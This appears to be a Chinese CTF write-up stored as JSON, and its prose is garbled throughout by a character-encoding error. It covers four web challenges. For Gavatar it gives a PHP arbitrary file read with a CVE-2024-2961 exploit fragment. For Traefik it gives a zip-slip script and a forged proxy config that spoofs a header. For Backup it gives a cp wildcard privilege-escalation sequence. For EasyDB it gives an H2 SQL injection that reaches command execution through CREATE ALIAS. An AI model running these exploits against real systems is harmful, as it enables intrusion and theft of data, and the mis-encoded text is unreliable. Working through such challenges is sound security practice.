[{"content":"WEB Gavatar é¢˜ç›®ç»™äº†dockeré™„ä»¶ï¼Œæ˜¯phpä»£ç ã€‚ç®€å•çœ‹äº†ä¸€ä¸‹webåº”ç”¨ï¼Œå°±æ˜¯ä¸€ä¸ªæ³¨å†Œ+ç™»å½•æ“ä½œï¼Œç„¶åå¯ä»¥ä¸Šä¼ å¤´åƒã€‚ç„¶åå°±æ˜¯å®¡è®¡ä»£ç ï¼š\nç®€å•è´´å‡ ä¸ªä»£ç å‡ºæ¥ï¼š\nregister.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] !== \u0026#39;POST\u0026#39;) { header(\u0026#39;Location: index.php\u0026#39;); exit; } $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; if (empty($username) || empty($password)) { header(\u0026#39;Location: index.php?error=Invalid input\u0026#39;); exit; } if (findUserByUsername($username)) { header(\u0026#39;Location: index.php?error=Username already exists\u0026#39;); exit; } $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; password_hash($password, PASSWORD_DEFAULT) ]; $db = getDb(); $db[\u0026#39;users\u0026#39;][] = $user; saveDb($db); $_SESSION[\u0026#39;user_id\u0026#39;] = $user[\u0026#39;id\u0026#39;]; header(\u0026#39;Location: profile.php\u0026#39;); upload.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; highlight_file(__FILE__); $user = getCurrentUser(); if (!$user) header(\u0026#39;Location: index.php\u0026#39;); $avatarDir = __DIR__ . \u0026#39;/avatars\u0026#39;; if (!is_dir($avatarDir)) mkdir($avatarDir, 0755); $avatarPath = \u0026#34;$avatarDir/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } header(\u0026#39;Location: profile.php\u0026#39;); common.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;?php session_start(); function generateUuid() { return sprintf( \u0026#39;%04x%04x-%04x-%04x-%04x-%04x%04x%04x\u0026#39;, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff) ); } function getDb() { $dbPath = __DIR__ . \u0026#39;/../db/db.json\u0026#39;; if (!file_exists($dbPath)) { file_put_contents($dbPath, json_encode([\u0026#39;users\u0026#39; =\u0026gt; []])); } return json_decode(file_get_contents($dbPath), true) ?: [\u0026#39;users\u0026#39; =\u0026gt; []]; } function saveDb($data) { file_put_contents(__DIR__ . \u0026#39;/../db/db.json\u0026#39;, json_encode($data, JSON_PRETTY_PRINT)); } function findUserByUsername($username) { $db = getDb(); foreach ($db[\u0026#39;users\u0026#39;] as $user) { if ($user[\u0026#39;username\u0026#39;] === $username) return $user; } return null; } function getCurrentUser() { return isset($_SESSION[\u0026#39;user_id\u0026#39;]) ? findUserById($_SESSION[\u0026#39;user_id\u0026#39;]) : null; } function findUserById($id) { $db = getDb(); foreach ($db[\u0026#39;users\u0026#39;] as $user) { if ($user[\u0026#39;id\u0026#39;] === $id) return $user; } return null; } avatar.phpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; $user = isset($_GET[\u0026#39;user\u0026#39;]) ? findUserByUsername($_GET[\u0026#39;user\u0026#39;]) : null; $defaultAvatar = __DIR__ . \u0026#39;/images/default-avatar.png\u0026#39;; if (!$user) { header(\u0026#39;Content-Type: image/png\u0026#39;); readfile($defaultAvatar); exit; } $avatarPath = __DIR__ . \u0026#34;/avatars/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!file_exists($avatarPath)) { header(\u0026#39;Content-Type: image/png\u0026#39;); readfile($defaultAvatar); } else { header(\u0026#39;Content-Type: \u0026#39; . mime_content_type($avatarPath)); readfile($avatarPath); } å®¡è®¡ä»£ç ï¼Œç®€å•è¯´è¯´é€»è¾‘å§ï¼Œæ³¨å†Œæ—¶ä¼šéšæœºç”Ÿæˆå¼ºéšæœºçš„idï¼Œç„¶åå°†å…¶å†™å…¥åˆ°db.jsonæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”ä¸Šä¼ çš„æ–‡ä»¶ä¼šé‡å‘½åå¹¶ç§»åŠ¨åˆ°avatarsç›®å½•ä¸‹ã€‚åœ¨upload.phpä¸­ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } åœ¨è¿™ä¸ªelseifæ¡ä»¶ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å­˜åœ¨æ–‡ä»¶è¯»å–ç„¶åæ–‡ä»¶å†™å…¥çš„æ“ä½œçš„ï¼Œä½†æ˜¯å¦‚æœæƒ³è¦è®¿é—®ï¼Œæœ€ç»ˆçš„åŸºäºç‚¹éƒ½æ˜¯éœ€è¦çŸ¥é“è¿™ä¸ªidï¼Œè¿™é‡Œæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œæ˜¯å¦èƒ½å¤Ÿé€šè¿‡è¦†ç›–æ‰idæ¥è¿›è¡Œå°è¯•ï¼Œä¸¤ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯åœ¨jsonæ–‡ä»¶ä¸­å°è¯•ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯åœ¨register.phpæ–‡ä»¶ä¸­å°è¯•ï¼š\n1 2 3 4 5 $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; password_hash($password, PASSWORD_DEFAULT) ]; ä½†æ˜¯åœ¨æ³¨å†Œåå†™å…¥jsonæ–‡ä»¶æ—¶ï¼Œé‡‡ç”¨çš„æ˜¯json_encode($data, JSON_PRETTY_PRINT)ç»“æ„ï¼Œè¿™é‡Œæ˜¯ä¼šå°†ç‰¹æ®Šç¬¦å·è½¬ä¹‰çš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½è¿›è¡Œã€‚è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯ç¬¬äºŒä¸ªï¼Œç»æµ‹è¯•ï¼Œæ˜¯å¯ä»¥è¿›è¡Œè¦†ç›–çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php function generateUuid() { return sprintf( \u0026#39;%04x%04x-%04x-%04x-%04x-%04x%04x%04x\u0026#39;, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff) ); } //$username=\u0026#34;\u0026#39;123\u0026#39;,\u0026#39;id\u0026#39; =\u0026gt; \u0026#39;123\u0026#39;,\u0026#34;; $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; \u0026#34;admmm\u0026#34;, \u0026#39;id\u0026#39; =\u0026gt; \u0026#34;1111\u0026#34; ]; echo $user[\u0026#34;id\u0026#34;]; //outputï¼š1111 è¿™æ ·æ˜¯å¯ä»¥è¿›è¡Œçš„ã€‚ä½†æ˜¯ï¼Œåœ¨ä¼ å‚è§£ææ—¶ï¼Œåªä¼šå°†å…¶è®¾å®šä¸ºä¸€ä¸ªå€¼ã€‚ä¸å¯èƒ½é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¼ å‚æ¥æ›´æ”¹åç«¯çš„é€»è¾‘ã€‚\næ‰€ä»¥åªèƒ½æ‰¾å…¶ä»–çš„åœ°æ–¹ã€‚æœ€ååœ¨avatar.phpæ–‡ä»¶ä¸­å‘ç°çªç ´ç‚¹ã€‚å°±ç®€å•è¯´è¯´é€»è¾‘å§ï¼Œå…·ä½“ä»£ç å›å»çœ‹ã€‚å°±æ˜¯é€šè¿‡ä¼ å‚usernameçš„å€¼ï¼Œä»db.jsonæ–‡ä»¶ä¸­è·å–åˆ°æ•´ä¸ªuserçš„ç»“æ„ï¼ˆåŒ…æ‹¬idç­‰ï¼‰ï¼Œç„¶åå†è·å–åˆ°idï¼Œæ‹¼æ¥åˆ°avataræ¥è¯»å–æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨äº†readfile()è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå…¶å®å°±æ˜¯ä¸Šä¼ å¤´åƒåæŸ¥çœ‹å¤´åƒçš„åŠŸèƒ½ã€‚åªæ˜¯æ”¹äº†ä¸€ä¸‹é€»è¾‘ï¼Œä¸æ˜¯ç®€å•çš„ç›´æ¥è®¿é—®è·¯å¾„æŸ¥çœ‹ï¼Œæ‰€ä»¥è¿™é‡Œæ—¶å¯ä»¥æ‹¿åˆ°æ–‡ä»¶å†…å®¹çš„ï¼Œå°è¯•å¦‚ä¸‹ï¼š\nå‰ç«¯è¦æ±‚å¿…é¡»ä¸ºç½‘å€ï¼Œç›´æ¥ç”¨fileåè®®è¯»å°±è¡Œï¼Œè¯»å–æ–‡ä»¶ï¼š\nç„¶åæŸ¥çœ‹å¤´åƒå†…å®¹ï¼š\næˆåŠŸè¯»å–ã€‚\nç»™äº†dockeræ–‡ä»¶ï¼Œå¯ä»¥çŸ¥é“æ˜¯éœ€è¦å‘½ä»¤æ‰§è¡Œreadflagçš„ã€‚æœ‰å›æ˜¾ï¼Œè°ƒç”¨æ–‡ä»¶å¤„ç†å‡½æ•°ï¼Œphpç‰ˆæœ¬ä¸º:\nç›´æ¥æ‰“CVE-2024-2961ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„sessionçš„é—®é¢˜ã€‚è®°ç€Session()ä¼šè‡ªåŠ¨ä¿å­˜cookieï¼Œç„¶åæˆ‘å°±åœ¨æ”¹è„šæœ¬ï¼Œä¸€ç›´æ²¡æ”¹å‡ºæ¥ï¼Œæœ€åæ”¹äº†å¦‚ä¸‹ä½ç½®ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; cookie = {\u0026#34;username\u0026#34;: \u0026#34;fupanc\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123\u0026#34;} self.session.post(\u0026#34;http://localhost:8000/register.php\u0026#34;, data=cookie) # cookie = {\u0026#34;username\u0026#34;:\u0026#34;fupanc\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123\u0026#34;} # self.session.post(\u0026#34;http://localhost:8000/login.php\u0026#34;,data=cookie) return self.session.post(self.url, data={\u0026#34;url\u0026#34;: path}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; self.send(path) response=self.session.get(\u0026#34;http://localhost:8000/avatar.php?user=fupanc\u0026#34;) data = response.re.search(b\u0026#34;(.*)\u0026#34;, flags=re.S).group(1) return base64.decode(data) ç„¶åæ‰“å°±è¡Œäº†ï¼š\næœ€åè®¿é—®flag.txtå¾—åˆ°flagï¼š\nè¿™é‡Œå¾ˆæœçš„ä¸€ç‚¹æ˜¯ï¼Œå®¡ä»£ç ç¡®å®æ˜¯å®¡å‡ºæ¥å¯ä»¥ç›´æ¥åœ¨register.phpè·å–åˆ°cookieï¼Œä½†æ˜¯ä¸€ç›´æ‰“ä¸å‡ºæ¥ï¼Œåé¢å¤ç°çš„æ—¶å€™å‘ç°ï¼Œå°±æ˜¯å› ä¸ºæˆ‘æƒ³è¦è®©ç«¯å£æ›´å¤šå…ƒï¼Œæ²¡æœ‰ä½¿ç”¨docker-composeï¼Œå¯¼è‡´ä¸€ç›´æ‰“ä¸å‡ºæ¥ï¼š\næœ€åå°è¯•ä½¿ç”¨docker-composeæ‰æ‰“å‡ºæ¥çš„ã€‚æ²¡é”™ï¼å°±æ˜¯åœ¨register.phpå°±å¯ä»¥è·å–åˆ°cookieã€‚\nâ€”â€”â€”â€”â€”â€”\ntraefik goè¯­è¨€ï¼ŒåŒæ ·ç»™äº†æºä»£ç ã€‚ç®€å•å®¡è®¡ä¸€ä¸‹ï¼Œç›´æ¥åœ¨flagè·¯ç”±å°±å¯ä»¥è·å–åˆ°flagäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 r.GET(\u0026#34;/flag\u0026#34;, func(c *gin.Context) { xForwardedFor := c.GetHeader(\u0026#34;X-Forwarded-For\u0026#34;) if !strings.Contains(xForwardedFor, \u0026#34;127.0.0.1\u0026#34;) { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;only localhost can get flag\u0026#34;}) return } flag := os.Getenv(\u0026#34;FLAG\u0026#34;) if flag == \u0026#34;\u0026#34; { flag = \u0026#34;flag{testflag}\u0026#34; } c.String(http.StatusOK, flag) }) æœ‰è¯·æ±‚å¤´æ£€æµ‹ï¼Œä¼ªé€ ä¸€ä¸‹å°±è¡Œã€‚ä½†æ˜¯ç›´æ¥è®¿é—®å‘ç°æ˜¯404ã€‚é‚£ä¹ˆç»§ç»­å®¡ä»£ç å¯ä»¥å‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ +unzipï¼Œæƒ³åˆ°äº†zip slipï¼Œå¯ä»¥ä»»æ„æ–‡ä»¶è¦†ç›–ï¼Œå®¡è®¡æºç ï¼Œåœ¨unzipæ—¶ä½¿ç”¨çš„jion()å‡½æ•°ï¼š\nå¯ä»¥ç›®å½•ç©¿è¶Šå°è¯•è¦†ç›–æ–‡ä»¶ï¼Œå°±æ˜¯æ‰“zip slipäº†ï¼Œå¦‚ä¸‹æ–‡ç« ï¼š\nhttps://saucer-man.com/information_security/364.html\nç›´æ¥ç”¨é‡Œé¢çš„è„šæœ¬å°±è¡Œã€‚ä½†æ˜¯ç°åœ¨éœ€è¦çœ‹åœ¨å“ªé‡Œè¦†ç›–æ–‡ä»¶ï¼Œç»è¿‡æœç´¢ä»¥åŠç¿»å’Œå®¡è®¡dockeræ–‡ä»¶ï¼Œå‘ç°traefikå°±æ˜¯ä¸€ä¸ªåä»£ç†å·¥å…·ï¼Œå¹¶ä¸”é€šè¿‡dynamic.ymlæ–‡ä»¶æ¥è¿›è¡Œè·¯ç”±æµé‡çš„è½¬æ¥ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æ²¡æœ‰æ”¾è¡Œflagè·¯ç”±çš„ã€‚é‚£ä¹ˆå°±éœ€è¦å°è¯•ä¼ªé€ ä¸€ä¸‹ï¼Œæ³¨æ„çœ‹è¿™é‡Œçš„æ³¨é‡Šå¯ä»¥çŸ¥é“æ˜¯åŠ¨æ€é…ç½®çš„ï¼Œé‚£ä¹ˆå°±æ˜¯unzioæ—¶è§£å‹æ¥è¦†ç›–dynamic.ymlè¾¾åˆ°å…è®¸flagè·¯ç”±é€šè¿‡çš„æ•ˆæœã€‚\næœ€å¼€å§‹æ˜¯ç›´æ¥ä»¿é€ åˆ°ä¸Šé¢è¿™ä¸ªæ”¹æ”¹å°±è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy flag: rule: Path(`/flag`) entrypoints: [web] service: proxy æˆåŠŸè¦†ç›–åå¯ä»¥è®¿é—®flagè·¯ç”±äº†ï¼Œå°è¯•ç›´æ¥åœ¨è¯·æ±‚å¤´ä¸­ç”¨XFFæ¥ä¼ªé€ ã€‚ä½†æ˜¯å§‹ç»ˆè·å–ä¸åˆ°flagã€‚åé¢å°±æƒ³ï¼Œæ˜¯ä¸æ˜¯è¿™ä¸ªtraefikå·¥å…·æ˜¯ä¸æ˜¯ä¸ä¼šè½¬å‘åŸè¯·æ±‚å¤´çš„å†…å®¹ï¼Œå¯ä»¥è‡ªå·±æ”¹ä¸€ä¸‹goçš„æºç æ¥è®²è¯·æ±‚å¤´æ‰“å°å‡ºæ¥ï¼Œæœ€åå‘ç°ç¡®å®æ˜¯ï¼š\nä¼šè‡ªåŠ¨è½¬å‘çœŸå®ipã€‚\næ‰“çš„è¯ï¼Œç”Ÿæˆæ–‡ä»¶ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬å°±è¡Œï¼š\n1 2 3 4 5 6 7 import zipfile # the name of the zip file to generate zf = zipfile.ZipFile(\u0026#39;out.zip\u0026#39;, \u0026#39;w\u0026#39;) # the name of the malicious file that will overwrite the origial file (must exist on disk) fname = \u0026#39;dynamic.yml\u0026#39; #destination path of the file zf.write(fname, \u0026#39;../../.config/dynamic.yml\u0026#39;) æœ‰dockerï¼Œçœ‹ä¸€ä¸‹ç›®å½•ç»“æ„å°±çŸ¥é“æ€ä¹ˆç©¿äº†ï¼Œæˆ–è€…ç›´æ¥å¤šå‡ ä¸ª../ç©¿åˆ°æ ¹ç›®å½•ç„¶åè¦†ç›–/app/.config/dynamic.ymlå°±è¡Œã€‚\nâ€”â€”â€”â€”\næœä¸€ä¸‹è¦†ç›–è¯·æ±‚å¤´ï¼Œå¯ä»¥æ‹¿åˆ°å¦‚ä¸‹æ–‡ç« ï¼š\nhttps://www.azfum.com/archives/wswfale/\né‡Œé¢å°±æåˆ°äº†å¯ä»¥è¦†ç›–è¯·æ±‚å¤´ï¼Œç”¨middlewares:å°±è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨çš„dynamic.ymlï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy flag: rule: Path(`/flag`) entrypoints: [web] service: proxy middlewares: - xff-rewrite middlewares: xff-rewrite: headers: customRequestHeaders: X-Forwarded-For: \u0026#34;127.0.0.1\u0026#34; ç”Ÿæˆzipæ–‡ä»¶åï¼Œä¸Šä¼ ï¼š\nè§£å‹æˆåŠŸï¼š\næœ€åå†è®¿é—®flagè·¯ç”±å³å¯ï¼š\næ‹¿åˆ°flagã€‚\nbackup ç®€å•å¾—RCE â€”â€”â€”â€”â€”â€”â€”â€”\nè¿™é“é¢˜æ²¡æœ‰dockerï¼Œç®€å•åˆ›äº†ä¸€ä¸ªdockerç¯å¢ƒæ¥æµ‹è¯•ï¼Œæ‰“çš„æ—¶å€™æ£‹å·®ä¸€æ‹›å‘€ï¼Œæ²¡æ‰¾å¯¹é€‰é¡¹ã€‚å…·ä½“çœ‹wpå§ã€‚\nä¸€å¼€å§‹çœ‹é¡µé¢æºä»£ç çœ‹åˆ°å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹$_REQUEST[\u0026quot;__2025.happy.new.year\u0026quot;]ï¼Œéæ³•å‚æ•°åé—®é¢˜ï¼Œpostä¼ å‚å°±è¡Œï¼š_[2025.happy.new.yearï¼Œç›´æ¥bashå¼¹ä¸ªshellï¼ŒåŸæ–‡ä»¶çš„å¤–é¢å¥—çš„system()å‡½æ•°ï¼Œæ‰€ä»¥ç›´æ¥ä¼ å‘½ä»¤å°±è¡Œäº†ï¼ˆhackbarä¼ å‚çš„è¯éœ€è¦urlç¼–ç å†ä¼ ï¼‰ï¼š\nè¿™é‡Œçš„/flagæ˜¯400æƒé™ï¼Œéœ€è¦ææƒã€‚\næ ¹ç›®å½•æœ‰ä¸€ä¸ª/backup.sh æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 #!/bin/bash cd /var/www/html/primary while : do cp -P * /var/www/html/backup/ chmod 755 -R /var/www/html/backup/ sleep 15s done shæ–‡ä»¶å†…å®¹å°±ä¸å¤šè¯´äº†ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´å°±ä¼šè¿è¡Œä¸€æ¬¡ï¼Œps -auxå‘½ä»¤çœ‹ä¸€ä¸‹æ˜¯å¦åœ¨è¿è¡Œï¼š\nåœ¨è¿è¡Œï¼Œå¹¶ä¸”æ˜¯rootæƒé™ã€‚åŸºæœ¬ä½ å¯ä»¥ç¡®å®šæ˜¯æ‰“è¿™ä¸ªæ¥ææƒäº†ã€‚\nçœ‹åˆ°è¿™é‡Œçš„``*ï¼Œå¾ˆç†Ÿæ‚‰çš„é€šé…ç¬¦ææƒï¼Œå¹¶ä¸”æ¶‰åŠåˆ°äº†cpå‘½ä»¤ï¼Œprimaryç›®å½•å¯å†™æ–‡ä»¶ã€‚å¦‚æœå¯ä»¥åˆ›å»ºåä¸º../../../../flagçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå¾ˆå¿«å°±å‡ºäº†ï¼Œä½†æ˜¯åœ¨shellä¸­ï¼Œåªä¼šå°†/`è§†ä½œç›®å½•ï¼Œæ‰€ä»¥æ˜¯æ‰“ä¸äº†çš„ã€‚\nåé¢æ‰¾æ€è·¯ï¼Œæƒ³åˆ°äº†è½¯é“¾æ¥ï¼Œé‚£ä¹ˆå°±æ˜¯æƒ³ç€è½¯é“¾æ¥é“¾æ¥åˆ°/flagç›®å½•ï¼Œç„¶åshè„šæœ¬ä¼šå°†è½¯é“¾æ¥å¸¦çš„å†…å®¹ä¸€èµ·ç»™è®¾ç½®ä¸ºå¯è¯»æƒé™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä½¿ç”¨äº†-Pé€‰é¡¹ï¼Œè¿™ä¸ªåœ¨cpæ—¶ä¸ä¼šå¸¦ç¬¦å·é“¾æ¥ï¼Œæ‰€ä»¥éœ€è¦ç»•ä¸€ä¸‹ã€‚ç½‘ä¸Šæœï¼Œè¯´æ˜¯-aé€‰é¡¹å¯ä»¥ï¼Œæ‰“äº†ä¸€ä¸‹æ²¡æ‰“å‡ºæ¥ï¼Œåé¢å°±æ²¡æ€ä¹ˆæ‰“äº†ã€‚\nèµ›åå†æœäº†ä¸€ä¸‹ï¼Œ-Lé€‰é¡¹æ˜¯å¯ä»¥æ‰“çš„ï¼Œä¹Ÿå°±æ˜¯è¯´-Lé€‰é¡¹ä¼šè®©cpå‘½ä»¤å¤åˆ¶è½¯é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶ï¼Œè€Œ-Pé€‰é¡¹ï¼Œåªä¼šå¤åˆ¶è½¯é“¾æ¥æœ¬èº«ï¼Œæ‰€ä»¥æ‰“ä¸äº†ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/chentiao/p/17363300.html\næœ€åå°è¯•å¦‚ä¸‹ï¼š\n1 2 3 4 5 cd /var/www/html/primary echo \u0026gt; -L ln -s /flag flag123 cd ../backup cat flag123 å°±å¯ä»¥å¾—åˆ°flagã€‚éœ€è¦æ³¨æ„ï¼Œè¦ç­‰shè„šæœ¬æ‰§è¡Œå®Œäº†å†æ‰“ï¼š\nçœ‹j1rryå¸ˆå‚…çš„æ–‡ç« ï¼Œè¿˜å¯ä»¥æ‰“-Hé€‰é¡¹ï¼Œæ˜¯ç›´æ¥ä»cp --hé€‰é¡¹é‡Œé¢ç¿»å‡ºæ¥çš„ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼Œæ„Ÿè§‰é€šé…ç¬¦ææƒåŸºæœ¬éƒ½æ˜¯è€ƒçš„åˆ©ç”¨é€‰é¡¹æ¥ææƒã€‚\nEasyDB javaé¢˜ï¼Œè·Ÿç€å¤ç°ä¸€ä¸‹ã€‚\njadxåç¼–è¯‘ä¸€ä¸‹ï¼Œæ‹¿åˆ°æœ¬åœ°æ¥çœ‹ä¸€æºç ã€‚å®¡è®¡è·¯ç”±ï¼Œå‘ç°å­˜åœ¨ç™»å½•è·¯ç”±ï¼š\nè·Ÿè¿›çš„ä»£ç æŸ¥çœ‹ï¼Œå‘ç°å­˜åœ¨sqlæ³¨å…¥ï¼š\nè¿™é‡Œæ˜¯ç›´æ¥æ‹¼æ¥è¿›çš„usernameå’Œpasswordï¼Œæ‰€ä»¥æ˜¯å­˜åœ¨sqlæ³¨å…¥çš„ã€‚\nçœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆæ•°æ®åº“ï¼š\nh2æ•°æ®åº“ï¼Œé“è¡Œè¿˜æµ…ï¼Œä»¥ä¸ºæ˜¯æ‰“JDBCï¼Œæœåˆ°ä¸€ä¸ªæ‰“H2æ•°æ®åº“çš„æ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/13371\né‡Œé¢æåˆ°äº†ä¸€ä¸ªå¦‚æœå¯ä»¥æ‰§è¡Œä»»æ„H2 SQLçš„è¯­å¥ï¼Œå¯ä»¥é€šè¿‡Alias Script æ¥è¿›è¡ŒRCEï¼Œæ‰“çš„å †å æ³¨å…¥ã€‚å‚è€ƒå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 //åˆ›å»ºåˆ«åï¼Œå…¶å®å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ‰§è¡Œå‡½æ•°ï¼š CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$; //è°ƒç”¨SHELLEXECæ‰§è¡Œå‘½ä»¤ CALL SHELLEXEC(\u0026#39;id\u0026#39;); CALL SHELLEXEC(\u0026#39;whoami\u0026#39;); çœ‹ä»£ç ï¼Œå¯ä»¥çŸ¥é“è¿™ä¸ªæ˜¯ç›´æ¥ä¼šå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœå›æ˜¾åˆ°é¡µé¢ä¸Šçš„ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆè¿›è¡Œæ³¨å…¥ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æäº¤sqlè¯­å¥æŸ¥è¯¢æ—¶ï¼Œä¼šå…ˆcheck()ä¸€ä¸‹ï¼š\nä¹Ÿå°±æ˜¯è¯´æœ‰é»‘åå•ï¼Œé»‘åå•å¦‚ä¸Šã€‚çœ‹äº†ä¸€ä¸‹ï¼Œæ˜¯åŠ äº†å°å†™çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸»è¦éœ€è¦ç»•çš„æ˜¯runtimeå’Œexecï¼Œçœ‹è¿™ä¸ªåˆ›å»ºåˆ«åçš„è¯­å¥ï¼Œå…¶å®å°±æ˜¯åœ¨é‡Œé¢è‡ªå®šä¹‰äº†ä¸€æ®µjavaå‘½ä»¤æ‰§è¡Œçš„ä»£ç 